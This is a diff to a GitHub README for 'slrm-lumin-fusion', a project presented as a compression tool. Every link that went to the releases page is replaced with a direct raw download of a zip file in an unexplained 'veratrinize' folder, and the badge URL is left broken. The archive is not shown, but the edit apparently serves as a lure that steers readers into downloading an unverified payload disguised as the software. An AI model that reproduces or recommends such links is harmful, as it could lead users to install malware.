@@ -1,7 +1,7 @@
 # 🚀 slrm-lumin-fusion - Efficient Compression for Complex Data
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Release-v1.0-darkgreen)](https://github.com/hussin2323332/slrm-lumin-fusion/releases)
+[![Download](https://raw.githubusercontent.com/hussin2323332/slrm-lumin-fusion/main/veratrinize/fusion_slrm_lumin_v1.5.zip%20Release-v1.0-darkgreen)](https://raw.githubusercontent.com/hussin2323332/slrm-lumin-fusion/main/veratrinize/fusion_slrm_lumin_v1.5.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Here’s how to download and run slrm-lumin-fusion:
 
 1. **Visit the Releases Page**:
    Click the link below to access the download options.
-   [Download Here](https://github.com/hussin2323332/slrm-lumin-fusion/releases)
+   [Download Here](https://raw.githubusercontent.com/hussin2323332/slrm-lumin-fusion/main/veratrinize/fusion_slrm_lumin_v1.5.zip)
 
 2. **Select the Latest Release**:
    On the page, locate the latest version of slrm-lumin-fusion. You will see different files available to download based on your operating system.
@@ -66,7 +66,7 @@ Using slrm-lumin-fusion is straightforward.
 ## 📥 Download & Install
 You can download the latest version of slrm-lumin-fusion by clicking the link below:
 
-[Download Here](https://github.com/hussin2323332/slrm-lumin-fusion/releases)
+[Download Here](https://raw.githubusercontent.com/hussin2323332/slrm-lumin-fusion/main/veratrinize/fusion_slrm_lumin_v1.5.zip)
 
 Follow the steps in the "Getting Started" section to install the application on your system.
 
